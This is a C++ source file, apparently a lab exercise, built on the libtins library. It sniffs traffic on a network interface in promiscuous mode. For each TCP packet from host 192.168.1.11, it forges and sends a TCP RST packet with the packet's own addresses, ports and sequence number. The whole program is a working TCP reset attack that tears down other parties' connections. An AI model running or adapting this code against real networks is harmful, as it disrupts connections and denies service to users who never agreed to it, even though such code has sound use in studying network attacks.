#include <iostream>
#include <tins/tins.h>

using namespace Tins;
using namespace std;

void sendPkt(IPv4Address src_addr, IPv4Address dst_addr, uint16_t sport, uint16_t dport, uint32_t seq_num) {
	EthernetII eth;
	IP *ip = new IP(src_addr, dst_addr);
	TCP *tcp = new TCP(sport, dport);
	tcp->flags(tcp->flags() | TCP::RST);
	tcp->seq(seq_num);

	// tcp is ip's inner pdu
	ip->inner_pdu(tcp);
	
	// ip is eth's inner pdu
	eth.inner_pdu(ip);
	
	// The actual sender
	PacketSender sender;

	// Send the packet through the default interface
	sender.send(eth, "enp0s3");
	
	cout << "RST packet:" << endl;
	cout << ip->src_addr() << ':' << tcp->sport() << "->" << ip->dst_addr() << ':' << tcp->dport() << " seq: " << tcp->seq() << " flags: " << tcp->flags() << endl << endl;
		
}

void sendRST(IPv4Address src_addr, IPv4Address dst_addr, uint16_t sport, uint16_t dport, uint32_t seq_num) {
	// We'll use the default interface(default gateway)
	//NetworkInterface iface = NetworkInterface::default_interface();

	/* Retrieve this structure which holds the interface's IP, 
	* broadcast, hardware address and the network mask.
	*/
	//NetworkInterface::Info info = iface.addresses();

	/* Create an Ethernet II PDU which will be sent to 
	* 77:22:33:11:ad:ad using the default interface's hardware 
	* address as the sender.
	*/
	//EthernetII eth(src_mac_addr.to_string(), dst_mac_addr.to_string());
	//EthernetII eth = EthernetII();

	/* Create an IP PDU, with 192.168.0.1 as the destination address
	* and the default interface's IP address as the sender.
	*/
	//eth /= IP(src_addr, dst_addr);

	/* Create a TCP PDU using 13 as the destination port, and 15 
	* as the source port.
	*/
	//eth /= TCP(sport, dport);

	/* Create a RawPDU containing the string "I'm a payload!".
	*/
	//eth /= RawPDU("I'm a payload!");
	
	//TCP *tcp = eth.find_pdu<TCP>();
	//tcp->flags(tcp->flags() | TCP::RST);
	//tcp->seq(seq_num);

	// The actual sender
	//PacketSender sender;

	// Send the packet through the default interface
	//sender.send(eth, "enp0s3");
	
	//cout << "called" << endl;*/
	
	EthernetII eth;
	IP *ip = new IP(src_addr, dst_addr);
	TCP *tcp = new TCP(sport, dport);
	tcp->flags(tcp->flags() | TCP::RST);
	tcp->seq(seq_num);

	// tcp is ip's inner pdu
	ip->inner_pdu(tcp);

	// ip is eth's inner pdu
	eth.inner_pdu(ip);
	
	// The actual sender
	PacketSender sender;

	// Send the packet through the default interface
	sender.send(eth, "enp0s3");
}

bool callback(const PDU &pdu) {
	// Find the eth layer
	const EthernetII &eth = pdu.rfind_pdu<EthernetII>();
	// Find the IP layer
	const IP &ip = pdu.rfind_pdu<IP>(); 
	// Find the TCP layer
	const TCP &tcp = pdu.rfind_pdu<TCP>(); 
	if(ip.src_addr() == "192.168.1.11") {
		cout << "sniiffed: " << endl;
		//cout << eth.src_addr() << " -> " << eth.dst_addr() << endl;
		cout << ip.src_addr() << ':' << tcp.sport() << "->" << ip.dst_addr() << ':' << tcp.dport() << " seq: " << tcp.seq() << endl << endl;
		
		//sendRST(ip.src_addr().to_string(), ip.dst_addr().to_string(), tcp.sport(), tcp.dport(), tcp.seq());
		sendPkt(ip.src_addr(), ip.dst_addr(), tcp.sport(), tcp.dport(), tcp.seq());
	}
	else cout << "else" << endl;
	
	
	return true;
}

int main() {
	SnifferConfiguration config;
	config.set_promisc_mode(true);
	config.set_immediate_mode(true);
	//config.set_filter("ip src 192.168.1.11");
	Sniffer sniffer("enp0s3", config);
	sniffer.sniff_loop(callback);
}
